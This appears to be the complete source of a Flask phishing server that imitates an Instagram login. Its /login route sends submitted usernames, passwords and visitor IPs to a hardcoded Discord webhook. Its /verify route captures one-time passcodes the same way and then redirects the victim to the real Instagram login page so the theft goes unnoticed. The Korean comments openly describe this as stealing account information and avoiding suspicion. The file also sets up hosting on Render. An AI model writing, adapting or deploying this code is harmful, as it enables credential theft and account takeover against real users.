from flask import Flask, render_template, request, redirect, url_for
import requests
import os

app = Flask(__name__)

# 당신의 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO17E_rE86GvK8vY-3D3S6T7U8V9W0X1Y2Z3A4B5C6D7E8F9G0"

@app.route('/')
def index():
    try:
        # 파일 이름이 index.html이므로 이를 호출
        return render_template('index.html')
    except Exception as e:
        # 에러 발생 시 로그 출력
        return f"서버 에러 (파일을 찾을 수 없음): {str(e)}", 500

@app.route('/login', methods=['POST'])
def login():
    # index.html의 name="username", name="password"와 일치
    uid = request.form.get('username')
    pw = request.form.get('password')
    
    if uid and pw:
        # 디스코드 전송 데이터 구성
        payload = {
            "embeds": [{
                "title": "🚨 [피싱 성공] 계정 정보 유출",
                "color": 16711680,
                "fields": [
                    {"name": "아이디(ID)", "value": f"`{uid}`", "inline": True},
                    {"name": "비밀번호(PW)", "value": f"`{pw}`", "inline": True}
                ],
                "footer": {"text": f"접속 IP: {request.remote_addr}"}
            }]
        }
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except:
            pass
        
        # 정보 뺏은 후 otp.html로 이동
        return render_template('otp.html')
    
    return redirect(url_for('index'))

@app.route('/verify', methods=['POST'])
def verify():
    # otp.html의 name="otp_code"와 일치
    auth_code = request.form.get('otp_code')
    
    if auth_code:
        # 인증번호 유출
        requests.post(WEBHOOK_URL, json={"content": f"🔑 **[가로챈 OTP]**: `{auth_code}`"})
        # 진짜 인스타로 리다이렉트해서 의심 피하기
        return redirect("https://www.instagram.com/accounts/login/")
    
    return redirect(url_for('index'))

# Render 서버 유지용
@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    # Render 동적 포트 설정
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
